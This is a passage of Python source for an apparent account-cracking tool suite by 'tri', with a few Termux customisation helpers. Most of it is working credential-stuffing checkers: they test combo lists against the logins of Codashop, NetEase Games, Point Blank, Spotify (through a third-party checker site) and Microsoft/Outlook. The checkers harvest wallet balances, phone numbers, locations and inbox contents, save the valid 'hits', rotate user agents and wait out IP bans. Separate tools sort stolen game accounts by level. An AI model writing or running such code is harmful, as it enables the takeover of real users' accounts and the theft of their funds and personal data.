            id_token = res.json()['AuthenticationResult']['IdToken']

            wallet_url = "https://wallet-api.codacash.com/user/wallet"
            wallet_headers = {
                "Authorization": id_token,
                "x-country-code": "608"
            }

            try:
                wallet_res = requests.get(wallet_url, headers=wallet_headers, timeout=10)
                wallet_data = wallet_res.json()
            except:
                print(f"{Fore.YELLOW}[!] No internet — waiting to reconnect...{Style.RESET_ALL}")
                wait_for_internet()
                continue

            if wallet_data.get("resultCode") != 0:
                print(f"{Fore.YELLOW}[✓] VALID (No wallet info): {combo}{Style.RESET_ALL}")
                return

            data = wallet_data["data"]
            balance = float(data.get("balanceAmount", 0))
            country = get_country(data.get("currencyCode", ''))
            mobile = data.get("mobile", 'N/A')

            info_block = (
                f"{Fore.GREEN}[✓] VALID: {combo}{Style.RESET_ALL}\n"
                f" ├─ BALANCE        : {balance}\n"
                f" ├─ COUNTRY        : {country}\n"
                f" └─ MOBILE         : {mobile}\n"
            )

            print(info_block)

            with open("coda_valid.txt", "a", encoding="utf-8") as f:
                f.write(f"{combo}\n{info_block}\n")
            if "Philippines" in country:
                with open("codaPH.txt", "a", encoding="utf-8") as f:
                    f.write(f"{combo}\n{info_block}\n")

            with lock:
                country_count[country] += 1
                if balance > country_max_balance[country]:
                    country_max_balance[country] = balance

            return

        except requests.exceptions.ConnectionError:
            print(f"{Fore.YELLOW}[!] No internet — waiting to reconnect...{Style.RESET_ALL}")
            wait_for_internet()
        except Exception:
            time.sleep(2)
            continue

def print_summary():
    print(f"\n{Fore.CYAN}✨ COUNTRY STATS:{Style.RESET_ALL}")
    for country, count in sorted(country_count.items(), key=lambda x: -x[1]):
        print(f"{country}: {count}")

    print(f"\n{Fore.MAGENTA}✨ HIGHEST BALANCE BY COUNTRY:{Style.RESET_ALL}")
    for country, amount in sorted(country_max_balance.items(), key=lambda x: -x[1]):
        print(f"{country}: {amount:.2f}")

def main_coda_checker():
    print(f"{Fore.CYAN}Codashop Checker with info | Airplane mode when IPBAN | By tri{Style.RESET_ALL}")
    combos = load_combos()
    print(f"{Fore.YELLOW}[!] Threads are locked to 5 for safety.{Style.RESET_ALL}")

    with ThreadPoolExecutor(max_workers=5) as executor:
        executor.map(validate_account, combos)

    print_summary()
    print(f"\n{Fore.GREEN}[✓] Done. Results saved to coda_valid.txt and codaPH.txt{Style.RESET_ALL}")
  
def run_ml_separator():
    import os
    import re
    import time
    from datetime import datetime
    from colorama import Fore, Style, init

    init(autoreset=True)

    EXPIRATION_DATETIME = "2027-02-23 11:05:00 PM"

    def check_expiration():
        now = datetime.now()
        exp = datetime.strptime(EXPIRATION_DATETIME, "%Y-%m-%d %I:%M:%S %p")
        if now > exp:
            print(Fore.RED + f"Expired as of {EXPIRATION_DATETIME}.")
            return False
        return True

    def display_banner():
        banner = """
+--------------------------------------------------------------+
|     WELCOME TO LEVEL SEPARATOR BY TRI ENJOY SEPARATE YOUR    |
|                       ML FILES                               |
+--------------------------------------------------------------+
"""
        print(Fore.CYAN + Style.BRIGHT + banner)

    def clean_field(text):
        text = re.sub(r"\s+UID:.*", "", text)
        text = re.sub(r"\s+Registered:.*", "", text)
        text = re.sub(r"\s+Name:.*", "", text)
        text = re.sub(r"Rank:.*", "", text)
        return text.strip()

    def format_account_line(email_pass, level, rank, country):
        return (
            f"{email_pass}\n"
            f" ├─ RANK    : {rank}\n"
            f" ├─ LEVEL   : {level}\n"
            f" ├─ COUNTRY : {country}\n"
            f" ├─LEVEL SEPARATOR BY TRI\n\n"
        )

    def print_graph(counts, total):
        print("\n" + Fore.CYAN + "+--------------------------------------------------+")
        print(Fore.CYAN + "|              LEVEL SEPARATOR - By TRI            |")
        print(Fore.CYAN + "+--------------------------------------------------+")
        ranges = [
            ("50-80", counts["50-80"], Fore.BLUE),
            ("81-90", counts["81-90"], Fore.GREEN),
            ("91-99", counts["91-99"], Fore.YELLOW),
            ("100-150", counts["100-150"], Fore.RED),
        ]
        for label, count, color in ranges:
            percent = (count / total * 100) if total > 0 else 0
            bar = "█" * max(1, (count * 30) // total)
            space = " " * (30 - len(bar))
            print(f"{color}| {label:<7} | {count:<4} | {bar}{space} | {percent:5.1f}% |")
        print(Fore.CYAN + "+--------------------------------------------------+")

    def process_accounts(file_path):
        bins = {
            "50-80_ml.txt": [],
            "81-90_ml.txt": [],
            "91-99_ml.txt": [],
            "100-150_ml.txt": []
        }
        graph = {k.split("_")[0]: 0 for k in bins}
        seen, success, failed = set(), 0, 0
        folder = os.path.dirname(file_path)

        try:
            with open(file_path, 'r', encoding='utf-8') as infile:
                lines = infile.readlines()

            print(Fore.CYAN + "\nProcessing Accounts...\n")

            for acc in lines:
                acc = acc.strip()
                email_pass_match = re.match(r"([^|]+)", acc)
                email_pass = email_pass_match.group(1).strip() if email_pass_match else "unknown:unknown"
                if email_pass in seen:
                    continue
                seen.add(email_pass)

                level_match = re.search(r"(?:Level:|level\s*=)\s*(\d+)", acc, re.I)
                level = int(level_match.group(1)) if level_match else None

                rank_match = re.search(r"(?:Rank:|max_rank\s*=)\s*([^|]+)", acc, re.I)
                rank = clean_field(rank_match.group(1)) if rank_match else "UNKNOWN"

                country_match = re.search(r"(?:Country:|country\s*=)\s*([^|]+)", acc, re.I)
                country = clean_field(country_match.group(1)) if country_match else "UNKNOWN"

                if level is None:
                    failed += 1
                    continue

                line = format_account_line(email_pass, level, rank, country)

                if 50 <= level <= 80:
                    bins["50-80_ml.txt"].append(line)
                    graph["50-80"] += 1
                elif 81 <= level <= 90:
                    bins["81-90_ml.txt"].append(line)
                    graph["81-90"] += 1
                elif 91 <= level <= 99:
                    bins["91-99_ml.txt"].append(line)
                    graph["91-99"] += 1
                elif 100 <= level <= 150:
                    bins["100-150_ml.txt"].append(line)
                    graph["100-150"] += 1
                else:
                    failed += 1
                    continue
                success += 1

            for name, lines in bins.items():
                if lines:
                    path = os.path.join(folder, name)
                    with open(path, 'w', encoding='utf-8') as f:
                        f.writelines(lines)
                    print(Fore.GREEN + f"Saved {len(lines)} accounts to {name}")

            print(Fore.MAGENTA + "\nProcessing Complete!")
            print(Fore.GREEN + f"✅ Total Unique Success: {success}")
            print(Fore.RED + f"❌ Total Failed : {failed}")

            for i in range(10, 0, -1):
                print(Fore.YELLOW + f"Wait 10s before showing result ({i})...")
                time.sleep(1)

            print_graph(graph, success)

        except FileNotFoundError:
            print(Fore.RED + f"The file '{file_path}' was not found.")
        except Exception as e:
            print(Fore.RED + f"An error occurred: {e}")

    if not check_expiration():
        return
    display_banner()
    file = input(Fore.YELLOW + "Enter File Name: ").strip()
    process_accounts(file)    

def run_codm_separator():
    import os
    import re
    from colorama import Fore, Style, init

    init(autoreset=True)

    def banner():
        print(Fore.CYAN + """
╔════════════════════════════════════════════════════╗
║        Welcome To Codm Separator Level Tool        ║
╚════════════════════════════════════════════════════╝
""")

    def extract_blocks(lines):
        blocks = []
        current_block = []
        for line in lines:
            if re.search(r'\[.*?\]\s*Login Successful', line, re.IGNORECASE):
                if current_block:
                    blocks.append('\n'.join(current_block))
                    current_block = [line]
                else:
                    current_block.append(line)
            elif re.match(r'^[-=]{10,}$', line):  # line like ------
                if current_block:
                    blocks.append('\n'.join(current_block))
                    current_block = []
            else:
                current_block.append(line)
        if current_block:
            blocks.append('\n'.join(current_block))
        return blocks

    def extract_info(block):
        level_match = re.search(r'Account\s*Level[:：]?\s*(\d{1,4})', block, re.IGNORECASE)
        status_match = re.search(r'Account\s*Status[:：]?\s*(Clean|Not\s*Clean|NotClean)', block, re.IGNORECASE)

        if not level_match or not status_match:
            return None, None

        level = int(level_match.group(1))
        status = status_match.group(1).strip().lower().replace(" ", "")
        if status not in ["clean", "notclean"]:
            return None, None
        return level, status

    def print_graph(clean_count, notclean_count):
        total = clean_count + notclean_count
        box_width = 58
        bar_len = 40
        count_width = 3

        clean_bar_size = int((clean_count / total) * bar_len) if total else 0
        notclean_bar_size = int((notclean_count / total) * bar_len) if total else 0

        clean_bar = Fore.GREEN + '█' * clean_bar_size
        notclean_bar = Fore.RED + '█' * notclean_bar_size

        def format_line(label, bar, count):
            bar_str = bar.ljust(bar_len)
            count_str = f"{count}".rjust(count_width)
            return f" {label:<9}{bar_str} {count_str} "

        print(Fore.MAGENTA + "╔" + "═" * (box_width - 2) + "╗")
        print(Fore.MAGENTA + " tri lvl graph result ".center(box_width))
        print(Fore.MAGENTA + "╠" + "═" * (box_width - 2) + "╣")
        print(format_line("Clean:", clean_bar, clean_count))
        print(format_line("Not Clean:", notclean_bar, notclean_count))
        print(Fore.MAGENTA + "╚" + "═" * (box_width - 2) + "╝")

    # --- Main separator logic starts here ---
    banner()
    file_name = input(Fore.YELLOW + "Enter file name: ").strip()

    if not os.path.exists(file_name):
        print(Fore.RED + f"❌ File '{file_name}' not found.")
        return

    with open(file_name, 'r', encoding='utf-8') as f:
        lines = f.read().splitlines()

    clean_list = []
    notclean_list = []

    blocks = extract_blocks(lines)
    for block in blocks:
        level, status = extract_info(block)
        if level is None or status is None:
            continue
        if 100 <= level <= 400:
            formatted_block = block.strip() + "\n\n------------------------------"
            if status == 'clean':
                clean_list.append(formatted_block)
            elif status == 'notclean':
                notclean_list.append(formatted_block)

    clean_count = len(clean_list)
    notclean_count = len(notclean_list)

    output_dir = "Lvl Separator"
    os.makedirs(output_dir, exist_ok=True)

    with open(os.path.join(output_dir, "100-400clean.txt"), 'w', encoding='utf-8') as f:
        f.write('\n\n'.join(clean_list))
    with open(os.path.join(output_dir, "100-400notclean.txt"), 'w', encoding='utf-8') as f:
        f.write('\n\n'.join(notclean_list))

    print()
    print(Fore.GREEN + f"✅ Saved {clean_count} accounts to {output_dir}/100-400clean.txt")
    print(Fore.RED   + f"❌ Saved {notclean_count} accounts to {output_dir}/100-400notclean.txt")
    print()
    print_graph(clean_count, notclean_count)

def run_termux_theme():
    os.system("clear")
    print_banner_box()

    nickname = input("\nEnter your nickname: ").strip().capitalize()
    print(f"\nHi {nickname or 'User'}, welcome to tri Checker!\n")

    confirm = input("Do you want to continue? (yes or no): ").strip().lower()
    if confirm != "yes":
        print("\n❌ Exiting... Goodbye!\n")
        sys.exit()

    apply_theme_and_font()
    print("\n⏳ Please wait 5 seconds, applying your theme and font...")
    time.sleep(5)

    print("\n✅ All settings applied successfully!")
    print("🔁 Exit Termux and open it again to see changes!\n")

def print_banner_box():
    box_text = "Welcome to Termux Theme Changer\nOwner : tri (the only owner)"
    lines = box_text.split("\n")
    width = max(len(line) for line in lines) + 4
    print("\033[95m" + "═" * width)
    for line in lines:
        print(f"║ {line.center(width - 4)} ║")
    print("═" * width + "\033[0m")

def apply_theme_and_font():
    os.system("termux-style color dark")
    os.system("termux-style font Hack")

def run_custom_ascii_banner():
    import os
    import time
    from termcolor import colored

    def print_banner_box():
        box_text = "Welcome to Termux Theme Changer\nOwner : tri (the only owner)"
        lines = box_text.split("\n")
        width = max(len(line) for line in lines) + 4
        print(colored("═" * width, "magenta"))
        for line in lines:
            print(colored(f"║ {line.center(width - 4)} ║", "magenta"))
        print(colored("═" * width, "magenta"))

    def change_theme():
        themes = [
            "default", "dark", "light", "green", "blood",
            "darker", "monokai", "dracula", "solarized", "gruvbox"
        ]
        print("\nAvailable Themes:")
        for i, theme in enumerate(themes, 1):
            print(f"  {i}. {theme.capitalize()}")

        while True:
            choice = input("\nEnter number to choose theme (1–10) or just press Enter to skip: ").strip()
            if not choice:
                break
            try:
                choice = int(choice)
                if 1 <= choice <= 10:
                    selected_theme = themes[choice - 1]
                    os.system(f"termux-style color {selected_theme}")
                    break
                else:
                    print("❌ Invalid choice. Try again.")
            except ValueError:
                print("❌ Please enter a valid number.")

    def generate_ascii_banner(nickname):
        print("\n📌 Paste your ASCII banner below.")
        print("✅ When done, press CTRL+D (or VolumeDown + D on Android) to save:\n")

        try:
            ascii_lines = []
            while True:
                line = input()
                ascii_lines.append(line)
        except EOFError:
            pass

        if not ascii_lines:
            ascii_lines = ["(empty banner)"]

        ascii_lines.append("")
        ascii_lines.append(f"[{nickname}]")

        width = max(len(line) for line in ascii_lines)
        top = "╔" + "═" * (width + 2) + "╗"
        bottom = "╚" + "═" * (width + 2) + "╝"
        middle = [colored(f"║ {line.ljust(width)} ║", "magenta") for line in ascii_lines]

        final_banner = "\n" + colored(top, "magenta") + "\n" + "\n".join(middle) + "\n" + colored(bottom, "magenta") + "\n"

        banner_path = os.path.expanduser("~/.banner")
        with open(banner_path, "w", encoding="utf-8") as f:
            f.write(final_banner)

        bashrc_path = os.path.expanduser("~/.bashrc")
        if not os.path.exists(bashrc_path):
            with open(bashrc_path, "w", encoding="utf-8") as f:
                f.write("# Termux startup config\n")

        with open(bashrc_path, "r", encoding="utf-8") as f:
            content = f.read()

        if "cat ~/.banner" not in content:
            with open(bashrc_path, "a", encoding="utf-8") as f:
                f.write("\ncat ~/.banner || true\n")

        print("\n✅ Your ASCII banner has been saved and will show on next Termux startup.")

    os.system("clear")
    print_banner_box()

    nickname = input("\nEnter your nickname: ").strip().capitalize()
    print(f"\nHi {nickname or 'User'}, welcome to tri Checker!")
    print("Let's start customizing your Termux. Enjoy using it!")

    action = input("\nMake sure after paste the ascii enter then press CTRL D !! NOW PRESS ENTER TO CONTINUE: ").strip().upper()
    if action == "C":
        change_theme()

    generate_ascii_banner(nickname or "User")

    print("\n⏳ Please wait 5 seconds while applying changes...")
    time.sleep(5)

    print("\n✅ All settings applied successfully!")
    print("🔁 Exit Termux and reopen to see your new ASCII banner!\n")

def run_termux_arrow_prompt():
    import os

    bashrc_path = os.path.expanduser("~/.bashrc")

    arrow_top = "╭──────╮"
    arrow_mid = "│  tri  : "
    arrow_bot = "╰──➤➤➤"

    # Correctly formatted PS1 line for bash (escape newlines, quotes)
    custom_prompt = (
        '# Custom Termux prompt with fancy arrow\n'
        'export PS1="\\[\\e[1;31m\\]'
        + arrow_top + '\\n' + arrow_mid + '\\n' + arrow_bot +
        ' \\[\\e[0m\\]"'
    )

    # Backup .bashrc if exists
    if os.path.exists(bashrc_path):
        os.rename(bashrc_path, bashrc_path + ".bak")

    # Write the new prompt to .bashrc
    with open(bashrc_path, "w") as f:
        f.write(custom_prompt + "\n")

    # Notify user
    print("\n✅ Custom fancy prompt has been set!")
    print("\n📟 To apply it now, type:\n  source ~/.bashrc")
    print("\n💡 Output will look like this:\n")
    print(arrow_top)
    print(arrow_mid)
    print(arrow_bot + " ")

import re
from tqdm import tqdm
from colorama import Fore, Style

def run_url_remover():
    def print_simple_banner():
        print(f"""
{Fore.BLUE}╔════════════════════════════════════════════╗
║       Url remover by tri welcome           ║
╚════════════════════════════════════════════╝{Style.RESET_ALL}
""")

    def loading_animation(duration=1):
        for _ in tqdm(range(50),
                      desc=f"{Fore.GREEN}Processing",
                      bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}",
                      ncols=60):
            time.sleep(duration / 50)

    def remove_urls_from_line(line):
        return re.sub(r'https?://\S+|www\.\S+', '', line)

    input_file = input(f"{Fore.YELLOW}Enter the input filename: {Style.RESET_ALL}").strip()
    output_file = "url_remove.txt"

    print_simple_banner()

    try:
        with open(input_file, 'r', encoding='utf-8') as infile:
            lines = infile.readlines()

        if not lines:
            print(f"{Fore.RED}❌ Error: Input file is empty!{Style.RESET_ALL}")
            return

        loading_animation()

        cleaned_lines = []
        for line in tqdm(lines,
                         total=len(lines),
                         desc=f"{Fore.CYAN}Removing URLs",
                         bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}",
                         ncols=60):
            cleaned_line = remove_urls_from_line(line.strip())
            if cleaned_line:
                cleaned_lines.append(cleaned_line)

        with open(output_file, 'w', encoding='utf-8') as outfile:
            outfile.write("\n".join(cleaned_lines) + "\n")

        print(f"\n{Fore.GREEN}✅ URLs removed successfully!")
        print(f"💾 Output saved to: {output_file}{Style.RESET_ALL}")

    except FileNotFoundError:
        print(f"{Fore.RED}❌ Error: Input file not found!{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}❌ Unexpected Error: {str(e)}{Style.RESET_ALL}")

def run_netease_checker():
    import hashlib
    import requests
    import json
    import sys
    from colorama import Fore, Style, init
    from fake_useragent import UserAgent
    import concurrent.futures
    import threading

    init()

    class NeteaseGamesChecker:
        def __init__(self):
            self.session = requests.Session()
            self.ua = UserAgent()
            self.success = 0
            self.failed = 0 
            self.invalid_pass = 0
            self.errors = 0
            self.counter_lock = threading.Lock()
            self.file_lock = threading.Lock()
            self.banner = f"""{Fore.CYAN}
╔════════════════════════════════════════════════════════╗
║        Welcome to tri Checker - Have fun checking!     ║
╠════════════════════════════════════════════════════════╣
{Style.RESET_ALL}"""

        def get_md5(self, password):
            return hashlib.md5(password.encode()).hexdigest()

        def get_random_ua(self):
            return self.ua.random

        def save_results(self, result_type, account, extra=""):
            filename = "netease_result.txt" if result_type == "success" else f"{result_type}.txt"
            with self.file_lock:
                with open(filename, "a", encoding="utf-8") as f:
                    if result_type == "success":
                        f.write(extra + "\n\n")
                    else:
                        f.write(f"{account} {extra}\n")

        def check_account(self, account_data):
            try:
                email, password = account_data.split(":")
                email = email.strip()
                password = password.strip()
                md5_pwd = self.get_md5(password)
                ua = self.get_random_ua()

                login_url = "https://account.neteasegames.com/oauth/v2/email/login?lang=en_US"
                login_data = {
                    "account": email,
                    "hash_password": md5_pwd,
                    "client_id": "official",
                    "response_type": "cookie",
                    "redirect_uri": "https://account.neteasegames.com/account/home?lang=en_US",
                    "state": "official_state"
                }
                headers = {
                    "Pragma": "no-cache",
                    "Accept": "*/*",
                    "User-Agent": ua,
                    "recaptcha-token": "STATIC_OR_DYNAMIC_TOKEN"
                }

                r = self.session.post(login_url, data=login_data, headers=headers, timeout=10)
                resp = r.json()

                with self.file_lock:
                    with open("responses.txt", "a", encoding="utf-8") as resp_f:
                        resp_f.write(f"\n{email}:{password}\n")
                        resp_f.write(json.dumps(resp, indent=2))
                        resp_f.write("\n" + "="*50 + "\n")

                if resp.get("code") == 1006 and resp.get("msg") == "Incorrect account or password.":
                    print(f"{Fore.RED}[INVALID] {email}:{password} - Invalid password{Style.RESET_ALL}")
                    with self.counter_lock:
                        self.invalid_pass += 1
                    self.save_results("invalid", f"{email}:{password}", "Invalid password")
                    return

                if "Account does not exist" in r.text:
                    print(f"{Fore.RED}[FAIL] {email}:{password} - Account does not exist{Style.RESET_ALL}")
                    with self.counter_lock:
                        self.failed += 1
                    self.save_results("failed", f"{email}:{password}", "Account does not exist")
                    return

                if resp.get("code") == 0:
                    info_url = "https://account.neteasegames.com/ucenter/user/info?lang=en_US"
                    info_headers = {
                        "User-Agent": ua,
                        "Pragma": "no-cache",
                        "Accept": "*/*"
                    }
                    info_r = self.session.get(info_url, headers=info_headers, timeout=10)
                    info = info_r.json()

                    user_id  = info["user"]["user_id"]
                    name     = info["user"]["account_name"]
                    location = info["user"]["location"]

                    success_output = (
                        f"[🌷✨]{email}:{password}\n"
                        f"[🌷✨]User ID: {user_id}\n"
                        f"[🌷✨]Name: {name}\n"
                        f"[🌷✨]Location: {location}\n\n"
                        f"-----------------------------------"
                    )

                    print(Fore.GREEN + success_output + Style.RESET_ALL)
                    with self.counter_lock:
                        self.success += 1
                    self.save_results("success", None, success_output)
                else:
                    err_msg = resp.get("message", "Unknown error")
                    print(f"{Fore.RED}[FAIL] {email}:{password} - {err_msg}{Style.RESET_ALL}")
                    with self.counter_lock:
                        self.failed += 1
                    self.save_results("failed", f"{email}:{password}", err_msg)

            except Exception as e:
                print(f"{Fore.RED}[ERROR] Error checking {email}:{password} - {str(e)}{Style.RESET_ALL}")
                with self.counter_lock:
                    self.errors += 1
                self.save_results("errors", f"{email}:{password}", str(e))

        def print_results(self):
            total = self.success + self.failed + self.invalid_pass + self.errors
            print(f"""
{Fore.CYAN}Results Summary:
Total Checked: {total}
Success: {Fore.GREEN}{self.success}{Fore.CYAN}
Failed: {Fore.RED}{self.failed}{Fore.CYAN}
Invalid Pass: {Fore.YELLOW}{self.invalid_pass}{Fore.CYAN}
Errors: {Fore.RED}{self.errors}{Fore.CYAN}

Results saved to:
- netease_result.txt
- failed.txt
- invalid.txt
- errors.txt
- responses.txt{Style.RESET_ALL}
""")

        def start(self):
            print(self.banner)
            filename = input(f"{Fore.YELLOW}Enter accounts file name: {Style.RESET_ALL}")
            try:
                with open(filename) as f:
                    accounts = f.read().splitlines()
            except FileNotFoundError:
                print(f"{Fore.RED}[ERROR] File not found!{Style.RESET_ALL}")
                sys.exit()

            print(f"\n{Fore.CYAN}Loaded {len(accounts)} accounts{Style.RESET_ALL}\n")

            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                executor.map(self.check_account, accounts)

            self.print_results()

    checker = NeteaseGamesChecker()
    checker.start()
 
from bs4 import BeautifulSoup
from rich.panel import Panel
from rich.table import Table
from rich.console import Console

PB_LOGIN_URL = "https://www.pointblank.id/login"
PB_PROFILE_URL = "https://www.pointblank.id/profile"

PB_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/119.0.0.0",
    "Mozilla/5.0 (Linux; Android 11; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.85 Mobile Safari/537.36",
]

console = Console()

def pb_random_headers():
    return {
        "User-Agent": random.choice(PB_USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded",
    }

def login_pointblank(username, password):
    session = requests.Session()
    session.headers.update(pb_random_headers())

    try:
        login_page = session.get(PB_LOGIN_URL, timeout=15)
        soup = BeautifulSoup(login_page.text, 'html.parser')
        csrf_input = soup.find("input", {"name": "csrf_token"})
        csrf_token = csrf_input['value'] if csrf_input else ""

        payload = {
            "username": username,
            "password": password,
            "csrf_token": csrf_token
        }

        res = session.post(PB_LOGIN_URL, data=payload, timeout=15, allow_redirects=True)

        if "logout" in res.text.lower() or "/dashboard" in res.url:
            profile = session.get(PB_PROFILE_URL, timeout=10)
            psoup = BeautifulSoup(profile.text, "html.parser")

            rank = psoup.select_one(".rank")
            gold = psoup.select_one(".gold")
            cash = psoup.select_one(".cash")

            table = Table(title=f"[green]LIVE ACCOUNT: {username}")
            table.add_column("Info", style="bold cyan")
            table.add_column("Value", style="white")

            table.add_row("Username", username)
            table.add_row("Password", password)
            table.add_row("Rank", rank.text.strip() if rank else "N/A")
            table.add_row("Gold", gold.text.strip() if gold else "N/A")
            table.add_row("Cash", cash.text.strip() if cash else "N/A")

            console.print(table)
        else:
            console.print(Panel(f"[red]DIE ACCOUNT[/red]\n[white]{username}:{password}", title="Invalid", border_style="red"))

    except requests.exceptions.RequestException as e:
        console.print(Panel(f"[bold red]ERROR[/bold red] - {username}:{password}\n{str(e)}", title="Connection Error", border_style="bright_red"))
    except Exception as e:
        console.print(Panel(f"[bold red]UNEXPECTED ERROR[/bold red]\n{str(e)}", title="Error", border_style="red"))

def run_pointblank_checker():
    console.print(Panel("[bold cyan]Point Blank Checker by tri | credits: Primo[/bold cyan]\n[white]Combo Format: username:password[/white]", title="📢 PB CHECKER", border_style="bright_blue"))
    combo_file = input("Enter combo file (e.g., combo.txt): ").strip()

    if not os.path.isfile(combo_file):
        console.print(f"[bold red]File not found:[/bold red] {combo_file}")
        return

    with open(combo_file, "r") as f:
        lines = [line.strip() for line in f if ":" in line]

    def worker(line):
        try:
            username, password = line.split(":", 1)
            login_pointblank(username, password)
            time.sleep(random.uniform(1.2, 2.2))
        except Exception as e:
            print(f"[!] Error: {e}")

    with ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(worker, lines)
 
def run_spotify_checker():
    import requests
    from threading import Thread, Lock
    from itertools import islice
    import os

    # Colors
    CYAN = "\033[96m"
    RESET = "\033[0m"

    # Thread lock
    lock = Lock()

    # Banner
    print(CYAN + "=" * 60)
    print("🔥📢 SPOTIFY ACCOUNT CHECKER - VIP TOOL by tri".center(60))
    print("        [BETA] Accurate Premium & Free Checker".center(60))
    print("        Send your feed/report issue to @destinyismineeee".center(60))
    print("=" * 60 + RESET)

    # File input
    account = input("\n[📂] Enter path to Spotify combo file: ").strip()
    if not os.path.exists(account):
        print(f"[❌] File '{account}' does not exist!")
        return
    elif os.path.getsize(account) == 0:
        print(f"[❌] File '{account}' is empty!")
        return

    try:
        premiumac = open("PremiumAccounts.txt", 'w')
        freeac = open("FreeAccounts.txt", 'w')
    except Exception as e:
        print(f"[!] File write error: {e}")
        return

    Pno = Fno = Dno = tryno = 0
    url = "https://checkz.net/tools/ajax.php"
    loaded = len(open(account).readlines())

    print(f"\n✅ {loaded} accounts loaded for checking...\n")
    print("Status\t|\tCountry\t|\tExpire Date\t|\tUsername:Password\n")

    def result(country, userpass, response):
        nonlocal Pno, Fno, Dno, tryno
        with lock:
            if 'Premium' in response.text:
                Pac = f"|Premium account| Country:{country} | {userpass.strip()}"
                premiumac.write(Pac + "\n")
                Pno += 1
                print(Pac)
            elif 'Free' in response.text:
                Fac = f"|Free account | Country:{country} Exp: Null| {userpass.strip()}"
                freeac.write(Fac + "\n")
                Fno += 1
                print(Fac)
            else:
                print(f"Dead account | Country: Null | Exp: Null | {userpass.strip()}")
                Dno += 1
            tryno += 1
            print(f"| {tryno} Checked | Premium: {Pno} | Free: {Fno} | Dead: {Dno}")

    def checker(userpass):
        try:
            form = {
                'checker': 'spotify',
                'mplist': userpass,
                'proxylist': '127.0.0.1:80'
            }
            response = requests.post(url, data=form, stream=True, timeout=30)
            try:
                country = (response.text.split("Cntry:", 1)[-1]).split(r"</td><td>", 1)[0]
            except:
                country = "Unknown"
            result(country, userpass, response)
        except Exception as e:
            with lock:
                print(f"[!] Request Error for {userpass.strip()}: {e}")

    class CheckerThread(Thread):
        def __init__(self, offset):
            super().__init__()
            self.offset = offset

        def run(self):
            with open(account, 'r') as lines:
                for line in islice(lines, self.offset, loaded, 8):
                    if ':' in line:
                        checker(line.strip())

    workers = [CheckerThread(i) for i in range(8)]
    for worker in workers:
        worker.start()
    for worker in workers:
        worker.join()

    print(f"\n✅ Total Checked Accounts: {tryno}")
    print("🟢 Premium saved to: PremiumAccounts.txt")
    print("🟡 Free saved to   : FreeAccounts.txt")

def run_supercell_checker():
    import requests
    import re
    import os
    import time
    from urllib.parse import parse_qs, urlparse
    from concurrent.futures import ThreadPoolExecutor
    from colorama import Fore, Style, init

    init(autoreset=True)

    class RealSupercellValidator:
        def __init__(self):
            self.success = []
            self.invalid = []
            self.session = requests.Session()

        def login_and_check(self, email, password):
            try:
                # Step 1: Check Microsoft Account Exists
                idp_url = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
                res = self.session.get(idp_url, timeout=10)
                if "MSAccount" not in res.text:
                    print(f"{Fore.RED}{email}:{password} ❌ INVALID")
                    self.invalid.append(f"{email}:{password}")
                    return

                # Step 2: Get login page and extract PPFT + urlPost
                auth_url = "https://login.live.com/"
                res = self.session.get(auth_url, timeout=10)
                ppft = re.search(r'name=\"PPFT\" id=\"i0327\" value=\"(.*?)\"', res.text)
                url_post = re.search(r"urlPost:'(.*?)'", res.text)

                if not ppft or not url_post:
                    print(f"{Fore.RED}{email}:{password} ❌ INVALID (PPFT not found)")
                    self.invalid.append(f"{email}:{password}")
                    return

                ppft_val = ppft.group(1)
                post_url = url_post.group(1)

                payload = {
                    'login': email,
                    'passwd': password,
                    'PPFT': ppft_val
                }

                headers = {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0'
                }

                login_response = self.session.post(post_url, data=payload, headers=headers, allow_redirects=True)

                # Step 3: Check if login succeeded
                if "Sign in to your account" in login_response.text or "error" in login_response.text.lower():
                    print(f"{Fore.RED}{email}:{password} ❌ INVALID")
                    self.invalid.append(f"{email}:{password}")
                    return

                # Step 4: Search inbox for 'Supercell'
                outlook_url = "https://outlook.live.com/mail/search?q=supercell"
                inbox_res = self.session.get(outlook_url, headers=headers, timeout=10)

                if "Supercell" in inbox_res.text:
                    print(f"{Fore.GREEN}{email}:{password} ✅ SUCCESS LOGIN AND HAVE SUPERCELL")
                    self.success.append(f"{email}:{password}")
                else:
                    print(f"{Fore.YELLOW}{email}:{password} ❌ LOGIN OK BUT NO SUPERCELL")
                    self.invalid.append(f"{email}:{password}")

            except Exception as e:
                print(f"{Fore.RED}[ERROR] {email}:{password} => {e}")

        def run(self, combo_file):
            if not os.path.exists(combo_file):
                print("Combo file does not exist.")
                return

            with open(combo_file, 'r') as f:
                lines = [line.strip() for line in f if ':' in line]

            with ThreadPoolExecutor(max_workers=5) as executor:
                for line in lines:
                    email, password = line.split(':', 1)
                    executor.submit(self.login_and_check, email, password)

            # Save results
            with open("supercell_valid.txt", 'w') as f:
                for hit in self.success:
                    f.write(hit + '\n')
            with open("supercell_invalid.txt", 'w') as f:
                for bad in self.invalid:
                    f.write(bad + '\n')

            print(f"\n{Fore.CYAN}[✓] Done checking. Hits saved to supercell_valid.txt")

    print(Fore.CYAN + "[📂] Enter path to your combo file (email:password):")
    file_path = input(Style.RESET_ALL).strip()
    checker = RealSupercellValidator()
    checker.run(file_path)
   
    
def signal_handler(signum, frame):
    print("\033[0m", end="")
    print(f"\n  {Fore.LIGHTCYAN_EX}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Fore.RESET}")
    print(f"  {Fore.YELLOW}⚠️  Interrupted by user - Exiting immediately{Fore.RESET}")
